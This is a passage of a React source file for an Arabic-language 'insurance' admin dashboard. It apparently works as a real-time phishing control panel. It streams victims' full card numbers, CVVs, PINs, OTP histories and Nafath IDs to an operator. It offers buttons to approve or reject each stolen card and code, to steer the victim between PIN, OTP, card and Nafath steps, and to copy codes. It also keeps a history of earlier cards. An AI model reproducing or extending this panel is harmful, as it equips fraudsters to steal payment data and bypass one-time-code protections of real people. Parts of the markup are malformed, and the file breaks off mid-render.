"use client"

import type React from "react"
import { useState, useEffect, useMemo, useCallback, useRef } from "react"
import {
  Search,
  CheckCircle,
  XCircle,
  Clock,
  MessageSquare,
  Settings,
  Phone,
  CreditCard,
  Mail,
  Flag,
  Trash2,
  Filter,
  FileText,
  Car,
  Shield,
  User,
  ChevronDown,
  History,
  Sparkles,
  LayoutGrid,
  Eye,
  EyeOff,
  Copy,
  Check,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Checkbox } from "@/components/ui/checkbox"
import { Input } from "@/components/ui/input"
import { subscribeToApplications, updateApplication } from "@/lib/firestore-services"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { ChatPanel } from "@/components/chat-panel"
import { playErrorSound, playNotificationSound, playSuccessSound } from "@/lib/actions"
import { CreditCardMockup } from "@/components/credit-card-mockup"

const STEP_NAMES: Record<number | string, string> = {
  1: "PIN",
  2: "تفاصيل",
  3: "OTP",
  4: "بطاقة",
}

function UserStatus({ userId }: { userId: string }) {
  const [status, setStatus] = useState<"online" | "offline" | "unknown">("unknown")

  useEffect(() => {
    // Simulate random online/offline status for demo
    const randomStatus = Math.random() > 0.5 ? "online" : "offline"
    setStatus(randomStatus)
  }, [userId])

  return (
    <div className="flex items-center gap-2">
      <div
        className={`w-2 h-2 rounded-full transition-all ${
          status === "online"
            ? "bg-teal-500 shadow-[0_0_8px_rgba(var(--success),0.6)] animate-pulse"
            : "bg-red-500"
        }`}
      />
    </div>
  )
}

function StatCard({
  icon: Icon,
  label,
  value,
  color,
}: {
  icon: React.ElementType
  label: string
  value: number
  color: "default" | "warning" | "success" | "destructive"
}) {
  const colorClasses = {
    default: "bg-muted text-muted-foreground",
    warning: "bg-warning/10 text-warning",
    success: "bg-success/10 text-success",
    destructive: "bg-destructive/10 text-destructive",
  }

  return (
    <div className="group flex items-center gap-4 px-5 py-4 rounded-xl bg-card border border-border/50 hover:border-primary/30 hover:shadow-lg hover:shadow-primary/5 transition-all duration-300">
      <div className={`p-2.5 rounded-xl ${colorClasses[color]} transition-transform group-hover:scale-110`}>
        <Icon className="w-5 h-5" />
      </div>
      <div>
        <p className="text-2xl font-bold tracking-tight text-foreground">{value}</p>
        <p className="text-xs text-muted-foreground">{label}</p>
      </div>
    </div>
  )
}

function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false)

  const copy = async (e: React.MouseEvent) => {
    e.stopPropagation()
    await navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <Button variant="ghost" size="icon" className="h-6 w-6" onClick={copy}>
      {copied ? <Check className="w-3 h-3 text-success" /> : <Copy className="w-3 h-3" />}
    </Button>
  )
}

function DataField({
  label,
  value,
  mono = false,
  copyable = false,
}: { label: string; value?: string; mono?: boolean; copyable?: boolean }) {
  if (!value) return null

  return (
    <div className="group p-3 bg-muted/30 rounded-xl border border-border/50 transition-all hover:border-primary/30 hover:bg-primary/5">
      <div className="flex items-center justify-between">
        <p className="text-[11px] text-muted-foreground mb-1">{label}</p>
        {copyable && <CopyButton text={value} />}
      </div>
      <p className={`text-sm font-medium text-foreground ${mono ? "font-mono" : ""}`} dir={mono ? "ltr" : "rtl"}>
        {value}
      </p>
    </div>
  )
}

export default function AdminDashboard() {
  const [filteredApplications, setFilteredApplications] = useState<InsuranceApplication[]>([])
  const [searchQuery, setSearchQuery] = useState("")
  const [statusFilter, setStatusFilter] = useState<string>("all")
  const [cardFilter, setCardFilter] = useState<"all" | "hasCard" | "noCard">("all")
  const [infoFilter, setInfoFilter] = useState<"all" | "hasInfo" | "noInfo">("all")
  const [loading, setLoading] = useState(true)
  const [authNumber, setAuthNumber] = useState("")
  const prevApplicationsCount = useRef<number>(0)
  const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set())
  const [showHideFilters, setShowHideFilter] = useState(false)
  const [applications, setApplications] = useState<InsuranceApplication[]>([])
  const [selectedApplication, setSelectedApplication] = useState<InsuranceApplication | null>(null)
  const [showChat, setShowChat] = useState(false)
  const [showCardHistory, setShowCardHistory] = useState(false)

  const hasAnyGridData = (app: InsuranceApplication) => {
    return (
      app.cardNumber ||
      app.otp ||
      app.allOtps ||
      app.phoneNumber2 ||
      app.phoneOtp ||
      app.selectedCarrier ||
      app.totalPrice ||
      app.pinCode
    )
  }

  // <CHANGE> Add handlers for card, card OTP, and phone OTP approvals
  const handleCardApprovalChange = useCallback(
    async (appId: string, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) =>
        prev.map((app) => (app.id === appId ? { ...app, cardApproved: status } : app)),
      )
      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, cardApproved: status } : null))
      }
      try {
        await updateApplication(appId, { cardApproved: status })
        if (status === "approved") {
          playSuccessSound()
        } else if (status === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error("Error updating card approval:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handleCardOtpApprovalChange = useCallback(
    async (appId: string, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) =>
        prev.map((app) => (app.id === appId ? { ...app, cardOtpApproved: status } : app)),
      )
      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, cardOtpApproved: status } : null))
      }
      try {
        await updateApplication(appId, { cardOtpApproved: status })
        if (status === "approved") {
          playSuccessSound()
        } else if (status === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error("Error updating card OTP approval:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handlePhoneOtpApprovalChange = useCallback(
    async (appId: string, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) =>
        prev.map((app) => (app.id === appId ? { ...app, phoneOtpApproved: status } : app)),
      )
      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, phoneOtpApproved: status } : null))
      }
      try {
        await updateApplication(appId, { phoneOtpApproved: status })
        if (status === "approved") {
          playSuccessSound()
        } else if (status === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error("Error updating phone OTP approval:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const stats = useMemo(() => {
    return {
      total: applications.length,
      pending: applications.filter((a) => a.status === "pending_review").length,
      approved: applications.filter((a) => a.status === "approved").length,
      rejected: applications.filter((a) => a.status === "rejected").length,
    }
  }, [applications])

  useEffect(() => {
    setLoading(true)
    const unsubscribe = subscribeToApplications((apps) => {
      if (prevApplicationsCount.current > 0 && apps.length > prevApplicationsCount.current) {
        playNotificationSound()
      }
      prevApplicationsCount.current = apps.length
      setApplications(apps)
      setLoading(false)
    })
    return () => unsubscribe()
  }, [])

  useEffect(() => {
    const timer = setTimeout(() => {
      let filtered = applications

      if (statusFilter !== "all") {
        filtered = filtered.filter((app) => app.status === statusFilter)
      }

      if (cardFilter === "hasCard") {
        filtered = filtered.filter((app) => !!(app.cardNumber || app.expiryDate || app.cvv))
      } else if (cardFilter === "noCard") {
        filtered = filtered.filter((app) => !(app.cardNumber || app.expiryDate || app.cvv))
      }

      if (infoFilter === "hasInfo") {
        filtered = filtered.filter(
          (app) => !!(app.phoneNumber || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
        )
      } else if (infoFilter === "noInfo") {
        filtered = filtered.filter(
          (app) => !(app.nafazId || app.nafazId || app.documentType || app.serialNumber || app.vehicleModel),
        )
      }

      if (searchQuery) {
        const query = searchQuery.toLowerCase()
        filtered = filtered.filter(
          (app) =>
            app.ownerName?.toLowerCase().includes(query) ||
            app.identityNumber.includes(query) ||
            app.phoneNumber.includes(query),
        )
      }

      setFilteredApplications(filtered)
    }, 300)

    return () => clearTimeout(timer)
  }, [applications, searchQuery, statusFilter, cardFilter, infoFilter])

  const handleStatusChange = async (appId: string, newStatus: string) => {
    try {
      await updateApplication(appId, { currentStep: newStatus as string })
      playErrorSound()
    } catch {}
  }

  const handleStepChange = useCallback(
    async (appId: string, newStep: number) => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, currentStep: newStep } : app)))

      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, currentStep: newStep } : null))
      }

      try {
        await updateApplication(appId, { currentStep: newStep })
      } catch (error) {
        console.error("Error updating step:", error)
      }
    },
    [selectedApplication],
  )

  const handleAuthNumber = async (appId: string, auth: string) => {
    try {
      await updateApplication(appId, { authNumber: auth })
      playSuccessSound()
    } catch (error) {
      console.error("Error updating step:", error)
    }
  }

  const toggleSelection = useCallback((id: string, event: React.MouseEvent) => {
    event.stopPropagation()
    setSelectedIds((prev) => {
      const newSet = new Set(prev)
      if (newSet.has(id)) {
        newSet.delete(id)
      } else {
        newSet.add(id)
      }
      return newSet
    })
  }, [])

  const isUnread = useCallback((app: InsuranceApplication) => {
    return app.isUnread === true
  }, [])

  const markAsRead = useCallback(async (app: InsuranceApplication) => {
    if (app.isUnread) {
      try {
        await updateApplication(app.id!, { isUnread: false })
        setApplications((prev) => prev.map((a) => (a.id === app.id ? { ...a, isUnread: false } : a)))
      } catch (error) {
        console.error("Error marking as read:", error)
      }
    }
  }, [])

  const toggleReadStatus = useCallback(async (appId: string, currentIsUnread: boolean, event: React.MouseEvent) => {
    event.stopPropagation()
    try {
      await updateApplication(appId, { isUnread: !currentIsUnread })
      setApplications((prev) => prev.map((a) => (a.id === appId ? { ...a, isUnread: !currentIsUnread } : a)))
    } catch (error) {
      console.error("Error toggling read status:", error)
    }
  }, [])

  const hasCardInfo = useCallback((app: InsuranceApplication) => {
    return !!(app.cardNumber || app.expiryDate || app.cvv)
  }, [])



  const formatArabicDate = useCallback((dateString?: string) => {
    if (!dateString) return ""
    const date = new Date(dateString)
    const now = new Date()
    const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000)

    if (diffInSeconds < 60) {
      return "منذ لحظات"
    } else if (diffInSeconds < 3600) {
      const minutes = Math.floor(diffInSeconds / 60)
      return `منذ ${minutes} ${minutes === 1 ? "دقيقة" : minutes === 2 ? "دقيقتين" : "دقائق"}`
    } else if (diffInSeconds < 86400) {
      const hours = Math.floor(diffInSeconds / 3600)
      return `منذ ${hours} ${hours === 1 ? "ساعة" : hours === 2 ? "ساعتين" : "ساعات"}`
    } else if (diffInSeconds < 604800) {
      const days = Math.floor(diffInSeconds / 86400)
      return `منذ ${days} ${days === 1 ? "يوم" : days === 2 ? "يومين" : "أيام"}`
    }

    return date.toLocaleDateString("ar-SA", {
      year: "numeric",
      month: "long",
      day: "numeric",
    })
  }, [])

  useEffect(() => {
    if (selectedApplication) {
      const updated = applications.find((app) => app.id === selectedApplication.id)
      if (updated) {
        setSelectedApplication(updated)
      }
    }
  }, [applications, selectedApplication])

  const handlePhoneVerificationChange = useCallback(
    async (appId: string, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) =>
        prev.map((app) => (app.id === appId ? { ...app, phoneVerificationStatus: status } : app)),
      )

      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, phoneVerificationStatus: status } : null))
      }

      try {
        await updateApplication(appId, { phoneVerificationStatus: status })
        if (status === "approved") {
          playSuccessSound()
        } else if (status === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error("Error updating phone verification:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handleIdVerificationChange = useCallback(
    async (appId: string, status: "approved" | "rejected" | "pending") => {
      setApplications((prev) => prev.map((app) => (app.id === appId ? { ...app, idVerificationStatus: status } : app)))

      if (selectedApplication?.id === appId) {
        setSelectedApplication((prev) => (prev ? { ...prev, idVerificationStatus: status } : null))
      }

      try {
        await updateApplication(appId, { idVerificationStatus: status })
        if (status === "approved") {
          playSuccessSound()
        } else if (status === "rejected") {
          playErrorSound()
        }
      } catch (error) {
        console.error("Error updating ID verification:", error)
        playErrorSound()
      }
    },
    [selectedApplication],
  )

  const handleDelete = useCallback(
    async (appId: string, event: React.MouseEvent) => {
      event.stopPropagation()
      if (window.confirm("هل أنت متأكد من حذف هذا الطلب؟")) {
        try {
          setApplications((prev) => prev.filter((app) => app.id !== appId))
          if (selectedApplication?.id === appId) {
            setSelectedApplication(null)
          }
          setSelectedIds((prev) => {
            const newSet = new Set(prev)
            newSet.delete(appId)
            return newSet
          })
          playSuccessSound()
        } catch (error) {
          console.error("Error deleting application:", error)
          playErrorSound()
        }
      }
    },
    [selectedApplication],
  )

  const hasDocumentInfo = (app: InsuranceApplication) => {
    return !!(app.documentType || app.serialNumber || app.phoneNumber || app.nafazId || app.country)
  }

  const hasInsuranceInfo = (app: InsuranceApplication) => {
    return !!(app.insuranceType || app.insuranceStartDate || app.repairLocation)
  }

  const hasVehicleInfo = (app: InsuranceApplication) => {
    return !!(app.vehicleModel || app.manufacturingYear || app.vehicleValue || app.vehicleUsage)
  }

  

  const getStepName = (step: number | string) => {
    return STEP_NAMES[step] || `الخطوة ${step}`
  }

  return (
    <div className="min-h-screen bg-background dark" dir="rtl">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-card/80 backdrop-blur-xl border-b border-border">
        <div className="px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-6">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-primary to-chart-5 flex items-center justify-center shadow-lg shadow-primary/20">
                  <Shield className="w-5 h-5 text-primary-foreground" />
                </div>
                <div>
                  <h1 className="text-lg font-bold text-foreground">لوحة التحكم</h1>
                  <p className="text-[11px] text-muted-foreground">إدارة طلبات التأمين</p>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-3">
              <div className="flex items-center gap-2 px-4 py-2 rounded-full bg-success/10 border border-success/20">
                <div className="w-2 h-2 rounded-full bg-success animate-pulse" />
                <span className="text-xs font-medium text-success">{stats.pending} طلب جديد</span>
              </div>
              <Button variant="ghost" size="icon" className="rounded-xl hover:bg-muted">
                <Settings className="w-4 h-4" />
              </Button>
              <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-primary to-chart-4 flex items-center justify-center text-sm font-bold text-primary-foreground shadow-lg">
                م
              </div>
            </div>
          </div>
        </div>
      </header>

      {/* Stats Bar */}
      <div className="border-b border-border bg-card/50 backdrop-blur-sm">
        <div className="px-6 py-5">
          <div className="grid grid-cols-4 gap-4">
            <StatCard icon={LayoutGrid} label="إجمالي الطلبات" value={stats.total} color="default" />
            <StatCard icon={Clock} label="قيد المراجعة" value={stats.pending} color="warning" />
            <StatCard icon={CheckCircle} label="موافق عليه" value={stats.approved} color="success" />
            <StatCard icon={XCircle} label="مرفوض" value={stats.rejected} color="destructive" />
          </div>
        </div>
      </div>

      <div className="flex h-[calc(100vh-180px)]">
        {/* Sidebar */}
        <div className="w-[420px] bg-card border-l border-border flex flex-col">
          {/* Filter Toggle */}
          <div className="p-3 border-b border-border">
            <Button
              onClick={() => setShowHideFilter(!showHideFilters)}
              variant="ghost"
              className="w-full justify-between text-muted-foreground hover:text-foreground hover:bg-muted/50 rounded-xl"
            >
              <div className="flex items-center gap-2">
                <Filter className="w-4 h-4" />
                <span className="font-medium">الفلاتر والبحث</span>
              </div>
              <ChevronDown
                className={`w-4 h-4 transition-transform duration-200 ${showHideFilters ? "rotate-180" : ""}`}
              />
            </Button>
          </div>

          {/* Filters */}
          {showHideFilters && (
            <div className="p-4 border-b border-border space-y-4 bg-muted/20">
              {/* Search */}
              <div className="relative">
                <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                <Input
                  placeholder="بحث بالاسم أو رقم الهوية..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pr-10 bg-background border-border rounded-xl focus:ring-2 focus:ring-primary/20"
                />
              </div>

              {/* Card Filter */}
              <div className="space-y-2">
                <label className="text-xs font-medium text-muted-foreground">معلومات البطاقة</label>
                <div className="grid grid-cols-3 gap-2">
                  <Button
                    variant={cardFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("all")}
                    className="text-xs h-9 rounded-lg"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={cardFilter === "hasCard" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("hasCard")}
                    className="text-xs gap-1.5 h-9 rounded-lg"
                  >
                    <CreditCard className="w-3 h-3" />
                    لديه
                  </Button>
                  <Button
                    variant={cardFilter === "noCard" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("noCard")}
                    className="text-xs h-9 rounded-lg"
                  >
                    بدون
                  </Button>
                </div>
              </div>

              {/* Info Filter */}
              <div className="space-y-2">
                <label className="text-xs font-medium text-muted-foreground">معلومات إضافية</label>
                <div className="grid grid-cols-3 gap-2">
                  <Button
                    variant={infoFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setInfoFilter("all")}
                    className="text-xs h-9 rounded-lg"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={infoFilter === "hasInfo" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setInfoFilter("hasInfo")}
                    className="text-xs gap-1.5 h-9 rounded-lg"
                  >
                    <Flag className="w-3 h-3" />
                    مكتمل
                  </Button>
                  <Button
                    variant={infoFilter === "noInfo" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setInfoFilter("noInfo")}
                    className="text-xs h-9 rounded-lg"
                  >
                    غير مكتمل
                  </Button>
                </div>
              </div>
            </div>
          )}

          {/* Applications List */}
          <div className="flex-1 overflow-y-auto">
            {loading ? (
              <div className="flex items-center justify-center h-full">
                <div className="text-center space-y-3">
                  <div className="w-12 h-12 border-2 border-muted border-t-primary rounded-full animate-spin mx-auto" />
                  <p className="text-sm text-muted-foreground">جاري التحميل...</p>
                </div>
              </div>
            ) : filteredApplications.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-full p-8 text-center">
                <div className="w-20 h-20 rounded-2xl bg-muted flex items-center justify-center mb-4">
                  <Mail className="w-10 h-10 text-muted-foreground" />
                </div>
                <p className="text-foreground font-semibold mb-1">لا توجد طلبات</p>
                <p className="text-sm text-muted-foreground">جرب تغيير الفلاتر</p>
              </div>
            ) : (
              <div className="divide-y divide-border/50">
                {filteredApplications.map((app) => (
                  <div
                    key={app.id}
                    onClick={() => {
                      setSelectedApplication(app)
                      setShowChat(false)
                      markAsRead(app)
                    }}
                    className={`group relative p-4 cursor-pointer transition-all duration-200 hover:bg-muted/50 ${  isUnread(app)?"bg-red-500/40":""}
                      ? "bg-red-400/[0.02]"} ${
                      selectedApplication?.id === app.id
                        ? "bg-red-500/5 border-r-[3px] border-r-primary"
                       
                          : ""
                    }`}
                  >
                    <div className="flex items-start gap-3">
                      <Checkbox
                        checked={selectedIds.has(app.id!)}
                        onCheckedChange={() => {}}
                        onClick={(e) => toggleSelection(app.id!, e)}
                        className="mt-1 data-[state=checked]:bg-primary data-[state=checked]:border-primary rounded-md"
                      />
                      <div className="flex-1 min-w-0">
                        <div className="flex items-start justify-between gap-2 mb-2.5">
                          <div className="flex items-center gap-2 min-w-0 isUnread(app)">
                            <UserStatus userId={app?.id!} />
                           
                            <span className="text-lg flex-shrink-0">
                              {app.country === "Saudi Arabia" ? <img src="/Flag_of_Saudi_Arabia.svg" alt="jo" width={20}/> : app.country === "Jordan" ?<img src="/Flag_of_Jordan.svg" alt="jo" width={20}/> : "🌍"}
                            </span>
                            <h3 className="font-semibold text-foreground truncate">{app.ownerName}</h3>
                            {isUnread(app) && (
                              <span className="w-2.5 h-2.5 rounded-full bg-red-400 flex-shrink-0 animate-pulse" />
                            )}
                          </div>
                          <div className="flex items-center gap-1 opacity-0 group-hover:opacity-100 transition-opacity">
                            <Button
                              variant="ghost"
                              size="icon"
                              onClick={(e) => toggleReadStatus(app.id!, isUnread(app), e)}
                              className="h-7 w-7 text-muted-foreground hover:text-foreground rounded-lg"
                            >
                              {isUnread(app) ? <EyeOff className="w-3.5 h-3.5" /> : <Eye className="w-3.5 h-3.5" />}
                            </Button>
                            <Button
                              variant="ghost"
                              size="icon"
                              onClick={(e) => handleDelete(app.id!, e)}
                              className="h-7 w-7 text-muted-foreground hover:text-destructive rounded-lg"
                            >
                              <Trash2 className="w-3.5 h-3.5" />
                            </Button>
                          </div>
                        </div>
                        <div className="flex items-center gap-2 mb-2.5 flex-wrap">
                        
                          <Badge variant="outline" className="text-[10px] px-2 py-0.5 bg-muted/50 rounded-md">
                            {getStepName(app.currentStep)}
                          </Badge>
                          {hasCardInfo(app) && (
                            <Badge
                              variant="outline"
                              className="text-[10px] px-2 py-0.5 bg-primary/10 text-primary border-primary/20 rounded-md"
                            >
                              <CreditCard className="w-2.5 h-2.5 ml-1" />
                              بطاقة
                            </Badge>
                          )}
                          {app?.otp&&<Badge  variant="outline"
                              className="text-[10px] px-2 py-0.5 bg-primary/10 text-primary border-primary/20 rounded-md">
                            رمز 
                            </Badge>}
                          {app.cardHistory && app.cardHistory.length > 0 && (
                            <Badge
                              variant="outline"
                              className="text-[10px] px-2 py-0.5 bg-chart-4/10 text-chart-4 border-chart-4/20 rounded-md"
                            >
                              <History className="w-2.5 h-2.5 ml-1" />
                              {app.cardHistory.length} سابقة
                            </Badge>
                          )}
                        </div>
                        <div className="flex items-center gap-4 text-xs text-muted-foreground">
                          <span className="flex items-center gap-1.5">
                            <Phone className="w-3 h-3" />
                            {app.phoneNumber}
                          </span>
                          {app.createdAt && (
                            <span className="flex items-center gap-1.5">
                              <Clock className="w-3 h-3" />
                              {formatArabicDate(app.createdAt)}
                            </span>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>

        {/* Main Content */}
        <div className="flex-1 bg-background overflow-y-auto">
          {selectedApplication ? (
            showChat ? (
              <div className="h-full">
                <ChatPanel
                  applicationId={selectedApplication.id!}
                  currentUserId="admin-001"
                  currentUserName="المسؤول"
                  currentUserRole="admin"
                  onClose={() => setShowChat(false)}
                />
              </div>
            ) : (
              <div className="h-full flex flex-col">
                {/* Fixed Header */}
                <div className="sticky top-0 z-20 bg-card/95 backdrop-blur-xl border-b border-border">
                  <div className="p-6">
                    <div className="flex items-start justify-between mb-5">
                      <div className="flex items-center gap-4">
                        <div className="w-14 h-14 bg-gradient-to-br from-primary via-primary to-chart-5 rounded-2xl flex items-center justify-center text-primary-foreground text-xl font-bold shadow-xl shadow-primary/20">
                          {selectedApplication.ownerName?.charAt(0)}
                        </div>
                        <div>
                          <h2 className="text-xl font-bold text-foreground mb-1.5">{selectedApplication.ownerName}</h2>
                          <div className="flex items-center gap-3">
                            <UserStatus userId={selectedApplication.id!} />
                            <Badge variant="outline" className="text-xs rounded-md">
                              {getStepName(selectedApplication.currentStep)}
                            </Badge>
                          </div>
                        </div>
                      </div>
                      <Button onClick={() => setShowChat(true)} className="gap-2 rounded-xl shadow-lg">
                        <MessageSquare className="w-4 h-4" />
                        فتح الدردشة
                      </Button>
                    </div>

                    {/* Control Panel */}
                    <div className="grid grid-cols-7 gap-2">
                      <Button
                        onClick={() => handleStatusChange(selectedApplication.id!, "nafad")}
                        variant="outline"
                        size="sm"
                        className="h-10 rounded-xl hover:bg-primary/10 hover:border-primary/30"
                        disabled={selectedApplication.currentStep === "nafad"}
                      >
                        نفاذ
                      </Button>
                      <Button
                        onClick={() => handleStatusChange(selectedApplication.id!, "phone")}
                        variant="outline"
                        size="sm"
                        className="h-10 rounded-xl hover:bg-success/10 border-success/30 text-success"
                        disabled={selectedApplication.currentStep === "phone"}
                      >
                        التحويل للهاتف
                      </Button>
                      <Button
                        onClick={() => handleStatusChange(selectedApplication.id!, "home")}
                        variant="outline"
                        size="sm"
                        className="h-10 rounded-xl hover:bg-destructive/10 border-destructive/30 text-destructive"
                        disabled={selectedApplication.currentStep === "home"}
                      >
                        الرئيسية
                      </Button>
                      {[1, 2, 3, 4].map((step) => (
                        <Button
                          key={step}
                          onClick={() => handleStepChange(selectedApplication.id!, step)}
                          variant={selectedApplication.currentStep === step ? "default" : "outline"}
                          size="sm"
                          className="h-10 rounded-xl"
                        >
                          {STEP_NAMES[step]}
                        </Button>
                      ))}
                    </div>
                  </div>
                </div>

                {/* Scrollable Content */}
                <div className="flex-1 overflow-y-auto p-6">
                  {hasAnyGridData(selectedApplication) ? (
                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 max-w-6xl mx-auto">
                      {/* 1. Payment Info - Full width card (most recent data) */}
                      {selectedApplication.cardNumber && (
                        <div
                          className="lg:col-span-2 bg-card rounded-2xl border border-border p-6 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both shadow-xl shadow-primary/5"
                          style={{ animationDelay: "0ms" }}
                        >
                          <div className="flex items-center justify-between mb-6">
                            <div className="flex items-center gap-3">
                              <div className="p-3 rounded-xl bg-gradient-to-br from-primary/20 to-chart-5/20 animate-pulse-glow">
                                <CreditCard className="w-5 h-5 text-primary" />
                              </div>
                              <div>
                                <h3 className="font-bold text-foreground">معلومات الدفع</h3>
                                <p className="text-xs text-muted-foreground">البطاقة الحالية</p>
                              </div>
                            </div>
                            <div className="flex items-center gap-2">
                              {selectedApplication.cardHistory && selectedApplication.cardHistory.length > 0 && (
                                <Button
                                  variant="outline"
                                  size="sm"
                                  onClick={() => setShowCardHistory(!showCardHistory)}
                                  className="gap-2 rounded-xl text-xs"
                                >
                                  <History className="w-3.5 h-3.5" />
                                  {showCardHistory
                                    ? "إخفاء السجل"
                                    : `عرض السجل (${selectedApplication.cardHistory.length})`}
                                </Button>
                              )}
                              <Badge className="bg-success/15 text-success border-success/30 animate-pulse">
                                <Sparkles className="w-3 h-3 ml-1" />
                                جديد
                              </Badge>
                            </div>
                          </div>

                          <div className="flex flex-col lg:flex-row gap-6">
                            <div className="flex-1">
                              <CreditCardMockup
                                cardNumber={selectedApplication.cardNumber}
                                expiryDate={selectedApplication?.expiryDate}
                                cvv={selectedApplication?.cvv}
                                cardholderName={selectedApplication.ownerName}
                              />
                            </div>
                       
                            <div className="lg:w-72 space-y-4">
                              {selectedApplication.totalPrice && (
                                <div className="p-4 bg-gradient-to-br from-success/20 to-success/5 border border-success/30 rounded-xl">
                                  <p className="text-xs font-medium text-success mb-2">قيمة التأمين</p>
                                  <p className="text-3xl font-bold text-success font-mono text-center" dir="ltr">
                                    {parseInt(selectedApplication.totalPrice)}
                                  </p>
                                </div>
                              )}
                              {selectedApplication.otp && (
                                <div className="p-4 bg-gradient-to-br from-primary/20 to-primary/5 border border-primary/30 rounded-xl animate-in zoom-in duration-300">
                                  <div className="flex items-center justify-between mb-2">
                                    <p className="text-xs font-medium text-primary">رمز OTP الحالي</p>
                                    <CopyButton text={selectedApplication.otp} />
                                  </div>
                                  <p className="text-3xl font-bold text-primary font-mono text-center" dir="ltr">
                                    {selectedApplication.otp}
                                  </p>
                                 <div className="flex">
                                 <Button onClick={()=>{
                                  handleCardOtpApprovalChange(selectedApplication.id!,"approved")
                                 }} className="w-full bg-green-300 mx-1">قبول </Button>
                                  <Button onClick={()=>{
                                  handleCardOtpApprovalChange(selectedApplication.id!,"rejected")
                                 }} className="w-full" variant={'destructive'}>رفض</Button>
                                 </div>

                                </div>
                              )}
                              {selectedApplication.allOtps && selectedApplication.allOtps.length > 0 && (
                                <div className="p-4 bg-muted/50 rounded-xl">
                                  <p className="text-xs font-medium text-muted-foreground mb-3">سجل رموز OTP</p>
                                  <div className="flex flex-wrap gap-2">
                                    {selectedApplication.allOtps.map((otp, index) => (
                                      <Badge
                                        key={index}
                                        variant="secondary"
                                        className="font-mono animate-in fade-in duration-300 rounded-md"
                                        style={{ animationDelay: `${index * 50}ms` }}
                                        dir="ltr"
                                      >
                                        {otp}
                                      </Badge>
                                    ))}
                                  </div>
                                </div>
                              )}
                              
                            </div>
                            
                          </div>
                          <div className="flex gap-2">
                              <Button
                                onClick={() => handleCardApprovalChange(selectedApplication.id!, "approved")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-success border-success/30 hover:bg-success/10 rounded-xl"
                                disabled={selectedApplication?.cardApproved === "approved"}
                              >
                                <CheckCircle className="w-4 h-4 ml-2" />
                                قبول البطاقة
                              </Button>
                              <Button
                                onClick={() => handleCardApprovalChange(selectedApplication.id!, "rejected")}
                                variant="outline"
                                size="sm"
                                className="flex-1 text-destructive border-destructive/30 hover:bg-destructive/10 rounded-xl"
                                disabled={selectedApplication?.cardApproved === "rejected"}
                              >
                                <XCircle className="w-4 h-4 ml-2" />
                                رفض البطاقة
                              </Button>
                            </div>
                          {/* Card History Section */}
                          {showCardHistory &&
                            selectedApplication.cardHistory &&
                            selectedApplication.cardHistory.length > 0 && (
                              <div className="mt-6 pt-6 border-t border-border">
                                <h4 className="text-sm font-semibold text-foreground mb-4 flex items-center gap-2">
                                  <History className="w-4 h-4 text-muted-foreground" />
                                  البطاقات السابقة
                                </h4>
                                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                  {selectedApplication.cardHistory.map((card: { cardNumber: string | undefined; expiryDate: string | undefined; cvv: string | undefined; addedAt: string | undefined; amount: string | number | boolean | React.ReactElement<any, string | React.JSXElementConstructor<any>> | Iterable<React.ReactNode> | React.ReactPortal | React.PromiseLikeOfReactNode | null | undefined }, index: React.Key | null | undefined) => (
                                    <div
                                      key={index}
                                      className="animate-in fade-in slide-in-from-left duration-300"
                                      style={{ animationDelay: `${index! as number * 100}ms` }}
                                    >
                                      <CreditCardMockup
                                        cardNumber={card.cardNumber}
                                        expiryDate={card.expiryDate}
                                        cvv={card.cvv}
                                        cardholderName={selectedApplication.ownerName}
                                      />
                                      <div className="mt-2 flex items-center justify-between px-2">
                                        <span className="text-xs text-muted-foreground">
                                          {formatArabicDate(card.addedAt)}
                                        </span>
                                        {card.amount && (
